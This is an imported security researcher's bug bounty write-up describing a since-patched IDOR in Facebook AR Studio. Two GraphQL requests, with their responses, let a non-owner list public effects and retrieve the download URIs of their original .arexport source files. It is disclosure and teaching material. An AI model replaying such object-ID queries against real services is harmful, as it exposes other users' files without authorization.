---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-06-24_download-arexport-files-for-any-public-ar-studio-effect.md
original_filename: 2019-06-24_download-arexport-files-for-any-public-ar-studio-effect.md
title: Download .arexport files for any public AR Studio Effect
category: documents
detected_topics:
- idor
- command-injection
- otp
- graphql
tags:
- imported
- documents
- idor
- command-injection
- otp
- graphql
language: en
raw_sha256: bde8d1311a81d9ed70e039f656e6216bb065ef20a44cccc32d48055576f9200c
text_sha256: fe70d0090b28ad3b56fa53247c3c92f8bdef241ca51c2bec08a0409568ab2fdd
ingested_at: '2026-06-28T07:31:59Z'
sensitivity: unknown
redactions_applied: false
---

# Download .arexport files for any public AR Studio Effect

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-06-24_download-arexport-files-for-any-public-ar-studio-effect.md
- Source Type: markdown
- Detected Topics: idor, command-injection, otp, graphql
- Ingested At: 2026-06-28T07:31:59Z
- Redactions Applied: False
- Raw SHA256: `bde8d1311a81d9ed70e039f656e6216bb065ef20a44cccc32d48055576f9200c`
- Text SHA256: `fe70d0090b28ad3b56fa53247c3c92f8bdef241ca51c2bec08a0409568ab2fdd`


## Content

---
title: "Download .arexport files for any public AR Studio Effect"
page_title: "Download .arexport files for any public AR Studio Effect - These aren't the access_tokens you're looking for"
url: "https://philippeharewood.com/download-arexport-files-for-any-public-ar-studio-effect/"
final_url: "https://philippeharewood.com/download-arexport-files-for-any-public-ar-studio-effect/"
authors: ["Philippe Harewood (@phwd)"]
programs: ["Meta / Facebook"]
bugs: ["IDOR"]
publication_date: "2019-06-24"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5186
---

Posted on [June 24, 2019](https://philippeharewood.com/download-arexport-files-for-any-public-ar-studio-effect/)

# Download .arexport files for any public AR Studio Effect

AR Studio keeps a revision of files when applying for an AR Studio Effect [submission](https://developers.facebook.com/docs/ar-studio/docs/submitting/). It is possible to get this file as a non-owner.

Once approved, an AR studio effect is public. There is a query that lists these effects for an owner.

`POST /graphql?access_token=EAA...ZDZD HTTP/1.1  
Host: graph.facebook.com  
  
doc_id=1201966106594165  
variables ={ownerID:113702895386410}`

This will list any public effects
  
  
  {
  "data": {
  "ar_hub_effects_query": {
  "owner": {
  "effects": {
  "edges": [{
  "node": {
  "id": "EFFECT_ID",
  "ar_studio_effect": {
  "name": "Breakthings",
  }
  }
  }]
  }
  }
  }
  }
  }

With the effect_id known, request the revisions  
  
`graphql?q=node(EFFECT_ID){ar_studio_effect{revisions{uri,id,version,instances{id,name,size}}}}`

_Response_
  
  
  {
  "EFFECT_ID": {
  "ar_studio_effect": {
  "revisions": [{
  "uri": "https://cdn.fbsbx.com/v/t/1_n.arexport/breakthings.arexport",
  "id": "REVISION_ID",
  "version": 58,
  "instances": [{
  "__typename": "ARStudioEffectInstance",
  "id": "3",
  "name": "breakthings@uncompressed.arfx",
  "size": 6794
  },
  {
  "__typename": "ARStudioEffectInstance",
  "id": "3",
  "name": "breakthings@pvr.arfx",
  "size": 8703
  },
  {
  "__typename": "ARStudioEffectInstance",
  "id": "3",
  "name": "breakthings@etc.arfx",
  "size": 9536
  }
  ]
  }]
  }
  }
  }

Downloading the .arexport file for [AR Studio](https://sparkar.facebook.com/ar-studio/learn/documentation/downloads/) will load the original effects and all the assets used to create it.

**Impact**

This could allow a malicious user to access the .arexport files for effects that they should not have access to.

**Timeline**

Jun 24, 2019 – Report Sent  
Jun 25, 2019 – Confirmation of submission by Facebook  
Jun 27, 2019 – Further investigation by Facebook  
Aug 1, 2019 – Confirmation of patch by Facebook  
Aug 15, 2019 – Bounty awarded by Facebook
